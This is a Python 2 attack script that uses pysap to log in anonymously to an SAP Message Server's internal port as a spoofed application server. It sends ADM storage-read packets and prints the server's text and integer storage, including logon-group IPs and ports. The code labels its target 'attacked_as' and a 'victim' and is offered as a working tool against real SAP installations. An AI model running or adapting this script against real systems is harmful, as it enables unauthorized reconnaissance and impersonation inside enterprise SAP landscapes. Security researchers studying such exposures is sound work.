#!/usr/bin/env python
#
# SAP Message Server monitor text/integer-storage
# via ADM packets on internal port (39NN)
# -- gelim

from pysap.SAPNI import SAPNI,SAPNIStreamSocket
from pysap.SAPMS import SAPMS,SAPMSProperty,SAPMSLogon,SAPMSClient4,SAPMSAdmRecord
from pysap.SAPMS import ms_flag_values,ms_iflag_values,ms_opcode_values
from pysap.SAPMS import ms_client_status_values,ms_opcode_error_values
from pysap.SAPMS import ms_adm_opcode_values,ms_adm_rzl_strg_type_values
from scapy.supersocket import StreamSocket
from scapy.utils import hexdump,inet_ntoa,inet_aton
from scapy.packet import bind_layers
from scapy.layers.inet import TCP,Raw
from scapy.config import conf
from ansicolor import red,green,blue,yellow,cyan,magenta
from pprint import pprint
import argparse
import datetime
import socket
import struct
import random
import time
import os

help_desc = '''
SAP Message Server monitor text/integer-storage
via ADM packets on any MS ports (36NN or 39NN)
-- gelim
'''

def net_get_ip():
    return [(s.connect(('8.8.8.8', 53)),
             s.getsockname()[0],
             s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]

def gen_ms_servername(host, sid, instance):
    ms_fromname_len = 40 # hardcoded stuff
    as_name = '%s_%s_%s' % (host, sid, instance)
    num_space = 40 - len(as_name)
    if num_space < 0:
        print "[!] You have a hostname too long (hostname: %s)" % host
        print "    Shorten it by %d chars at least " % -num_space
        exit(1)
    as_name += ' '*num_space
    return as_name


def as_print(as_d, active=True):
    print "-"*120
    for a in as_d.keys():
        if active and as_d[a]['status'] != 1: # ACTIVE
            continue
        print ("%s" % a).ljust(30) + "| " + \
            ("%s" % as_d[a]['host']).ljust(20) + "| " + \
            ("%s" % as_d[a]['ip']).ljust(16) + "| " + \
            ("%s" % as_d[a]['port']).ljust(8) + "| " + \
            ("%s" % as_d[a]['type']).ljust(27) + "| " + \
            ("%s" % as_d[a]['status'])
    print "-"*120

def ms_connect(mshost, msport, login_packet):
    try:
        s = SAPNIStreamSocket.get_nisocket(mshost, msport)
    except socket.error:
        print "[!] Connection error to %s:%s" % (mshost, msport)
        exit(-1)
    r = s.sr(login_packet)
    print "[+] Connected to message server " + yellow(mshost + ":%s" % msport, bold=True)
    return s

def ms_logout(s):
    print "[+] Sending MS_LOGOUT"
    s.send(p_logout)
    s.close()

short_host = "fakeas%.4d" % (random.randint(0, 9999))
fake_as = {"ip": net_get_ip(),
           "host": short_host,
           "diag_port": 3200,
           "rfc_port": 3300}

# that's our target we want to monitor
attacked_as = {"ip": "172.16.100.50",
               "host": "sap-abap-01",
               "msport": 3901,
               "sid": "DEV",
               "instance": "00"}

my_name = gen_ms_servername(fake_as["host"], attacked_as["sid"], attacked_as["instance"])
anon_name = '-' + ' '*39
null_key = "\x00" * 8

p_login_anon = SAPMS(toname=anon_name,
                     fromname=anon_name,
                     flag=0,
                     iflag='MS_LOGIN_2',
                     padd=0)

p_logout = SAPMS(toname=anon_name,
                 fromname=anon_name,
                 flag=0,
                 iflag='MS_LOGOUT',
                 padd=0)

p_adm_readall_i = SAPMS(fromname=my_name,
                      toname=anon_name,
                      flag='MS_ADMIN',
                      iflag='MS_ADM_OPCODES',
                      key=null_key,
                      adm_recno=1,
                      adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                  rzl_strg_type='STRG_TYPE_READALL_OFFSET_I',
                                                  rzl_strg_name='                    ',
                                                  rzl_strg_uptime=7353,
                                                  rzl_strg_delay=290,
                                                  rzl_strg_integer3=7353)])
p_adm_readall_ofs = SAPMS(fromname=my_name,
                          toname=anon_name,
                          flag='MS_ADMIN',
                          iflag='MS_ADM_OPCODES',
                          key=null_key,
                          adm_recno=1,
                          adm_records=[SAPMSAdmRecord(opcode='AD_RZL_STRG',
                                                      rzl_strg_type='STRG_TYPE_READALL_OFFSET',
                                                      rzl_strg_name='                    ')])

#
# Print and if required send an answer to 
# the received packet
# s: SAPNISocket
# p: received SAPMS packet
#
def handle_answer(s, p):
    fromname = p.fromname
    try:
        flag = ms_flag_values[p[SAPMS].flag]
    except:
        flag = "0"
    try:
        opcode = str(ms_opcode_values[p[SAPMS].opcode])
    except:
        opcode = str(p[SAPMS].opcode)
    try:
        opcode_err = str(ms_opcode_error_values[p[SAPMS].opcode_error])
    except:
        opcode_err = 'None'

    if opcode_err == 'MSOP_OK':
        opcode_err = green(opcode_err)
    else:
        opcode_err = red(opcode_err, bold=True)

    if p.key != null_key:
        p.show()
        key = " key: " + yellow('NOT NULL', bold=True)
        print "[!] Out of order packets, reload this script."
        #s.close()
        #exit(0)
    else:
        key = ""
        
    print "flag: " + cyan(flag) + " opcode:" + cyan(opcode) + \
        " opcode_error: " + green(opcode_err) + key

    # "idenfify request from the server?
    if key != "" and flag == 'MS_REQUEST' and opcode == '0':
        s.send(ms_adm_nilist(p, 1))

#
# Get the answer from a ADM_STRG_READALL_I and parse it like:
# [ {server1: [int1, int2, ... int9],
# [
#
def parse_adm_readall_i(p):
    if not p.haslayer('SAPMSAdmRecord'):
        print "Packet has no 'SAPMSAdmRecord'."
        exit(-1)
    print "[+] Integer Storage"
    print
    records = dict()
    for e in p.adm_records:
        records[e.rzl_strg_name] = [e.rzl_strg_uptime,
                                    e.rzl_strg_integer1,
                                    e.rzl_strg_delay,
                                    e.rzl_strg_integer3,
                                    e.rzl_strg_users,
                                    e.rzl_strg_quality,
                                    e.rzl_strg_integer6,
                                    e.rzl_strg_integer7,
                                    e.rzl_strg_integer8,
                                    e.rzl_strg_integer9]

    # get back those 32 bits signed integers
    f = lambda x: x - 4294967296 if x > 0x7fffffff else x
    # pretty print that
    for r in records.keys():
        tmp_r = map(f , records[r])
        print green(r) + '\t: ' + '\t'.join([str(e) for e in tmp_r])
    return records

def parse_logon_group(v):
    marker, trash1, ip, trash2, port, kernel = struct.unpack('>9sbIIh4s', v[:24])
    ip = struct.pack('!I', ip)
    return [inet_ntoa(ip), str(port), kernel]

def parse_adm_readall_ofs(p):
    if not p.haslayer('SAPMSAdmRecord'):
        print "Packet has no 'SAPMSAdmRecord'."
        exit(-1)
    print "[+] Text Storage"
    records = dict()
    for e in p.adm_records:
        name = e.rzl_strg_name
        value = str(e.rzl_strg_value)
        type_v = ms_adm_rzl_strg_type_values[e.rzl_strg_type]

        # encoding of value for logon group is binary (IP + port etc.)
        if value.startswith('LG_EYECAT'):
            value = parse_logon_group(value)
        records[name] = (type_v, value)

    # pretty print that
    for r in records.keys():
        if isinstance(records[r][1], list):
            print red(r, bold=True) + '\t: ' + ' '.join(records[r][1])
        elif records[r][0].endswith('_C'):
            print green(r) + '\t: ' + str(records[r][1])
        #else:
        #    print green(r) + '\t: ' + "[list of integers]"
    return records

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument('-H', '--host', default='sap-abap-01', help='AS victim IP/hostname (default: \'sap-abap-01\')')
    parser.add_argument('-P', '--port', default=3901, type=int, help='AS internal message server port (default: 3901)')
    parser.add_argument('-S', '--instance', default='00', help='AS victim targeted instance (default: 00)')
    parser.add_argument('-d', '--debug', action='store_true', help='Show debug info')
    args = parser.parse_args()

    # update our default conf with customized version:
    attacked_as["host"] = args.host
    attacked_as["msport"] = args.port
    
    conf.L3Socket = StreamSocket
    bind_layers(TCP, SAPNI, dport=attacked_as['msport'])
    bind_layers(TCP, SAPNI, sport=attacked_as['msport'])
    bind_layers(SAPNI, SAPMS)

    s = ms_connect(attacked_as["host"], attacked_as["msport"], p_login_anon)

    #print "Information about Message Server storage"
    #print " You can find this information on the server in the file:"
    #print " /usr/sap/SID/ASCS01/work/SID_msg_server_adtl_storage"
    #print
    #r = s.sr(p_adm_readall_i)
    #parse_adm_readall_i(r)
    r = s.sr(p_adm_readall_ofs)
    parse_adm_readall_ofs(r)
    r = s.send(p_logout)
    s.close()
